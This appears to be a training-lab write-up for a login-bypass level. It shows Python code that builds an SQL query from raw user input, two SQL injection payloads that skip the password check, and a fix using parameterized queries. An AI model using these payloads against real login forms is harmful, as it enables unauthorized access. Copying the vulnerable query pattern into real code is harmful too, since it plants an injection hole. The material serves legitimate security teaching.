# Level 1-1: Login Bypass

**URL:** `/login`

**Objective:** Authenticate as any user without knowing their password.

## Vulnerable Code

```python
query = f"SELECT id, username, role FROM jumentususers WHERE username = '{username}' AND password = '{password}'"
cur.execute(query)
```

User input is interpolated directly into the SQL string. An attacker can inject SQL syntax that changes the query's logic.

**Payload 1 — comment out the password check:**
```text
username: admin' --
password: anything
```

The resulting query becomes:
```sql
SELECT id, username, role FROM jumentususers WHERE username = 'admin' --' AND password = 'anything'
```

The `--` comments out the password check entirely.

**Payload 2 — force a true condition on the password:**
```text
username: admin
password: ' OR '1'='1
```

The resulting query becomes:
```sql
SELECT id, username, role FROM jumentususers WHERE username = 'admin' AND password = '' OR '1'='1'
```

`'1'='1'` is always true, so the `AND password = ''` condition is bypassed.

## Fixed Code

```python
query = "SELECT id, username, role FROM jumentususers WHERE username = %s AND password = %s"
cur.execute(query, (username, password))
```

Using parameterized queries (prepared statements), the driver sends values separately from the SQL statement. The input is never interpreted as SQL. It's always treated as a literal value.
